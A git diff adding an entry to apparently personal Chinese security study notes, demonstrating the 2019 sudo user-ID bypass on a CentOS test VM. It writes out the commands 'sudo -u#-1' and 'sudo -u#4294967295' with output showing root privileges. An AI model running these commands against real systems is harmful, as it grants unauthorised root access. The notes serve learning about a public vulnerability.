@@ -207,6 +207,49 @@ https://legacy.gitbook.com/book/t0data/burpsuite/details
 
 OpenID 和 OAuth 有什么区别？ - 知乎用户的回答 - 知乎 https://www.zhihu.com/question/19628327/answer/23291315
 
+Linux sudo被曝提权漏洞，任意用户均能以root身份运行命令 https://www.ithome.com/0/450/420.htm
+```sh
+文中用的命令是 
+`sudo -u#-1 id -u` 或 `sudo -u#4294967295 id -u`，
+这俩没那么明显。我们来换命令实战下：
+----------------------------------------------------------------------------------------------------
+// 1.首先以root用户远程登陆一台CentOS 7.6的虚机。
+// 2.切换到用户bjweixj，这个其实是IT一个同事的账号，有sudo权限。
+[root@temptest ~]# su - bjweixj
+Last login: Mon Jul 22 21:51:00 CDT 2019 from 9.186.90.168 on pts/0
+
+// 3.直接分别执行`whoami`和`who am i`，结果符合预期。
+[bjweixj@temptest ~]$ whoami
+bjweixj
+[bjweixj@temptest ~]$ who am i
+root     pts/0        2019-10-15 12:26 (9.200.55.20)
+
+// 4.演示这个漏洞的时刻到了。
+//（第一个命令whoami本来应该显示当前用户的，对比一下上面，这里变成root了；第二个命令跟这个漏洞没关系，就是一起对比下）
+[bjweixj@temptest ~]$ sudo -u#-1 whoami
+root
+[bjweixj@temptest ~]$ sudo -u#-1 who am i
+root     pts/0        2019-10-15 12:26 (9.200.55.20)
+// 4.1用文章里的第二个命令也可以生效。
+[bjweixj@temptest ~]$ sudo -u#4294967295 whoami
+root
+[bjweixj@temptest ~]$ sudo -u#4294967295 who am i
+root     pts/0        2019-10-15 12:26 (9.200.55.20)
+
+// 5.但是如果用户本身没有sudo权限，这个漏洞也无法利用。
+[test1@temptest root]$ sudo -u#-1 whoami
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for test1: 
+test1 is not in the sudoers file.  This incident will be reported.
+```
+
 ## learned from work
 
 AppSec Fundamentals - Industry History
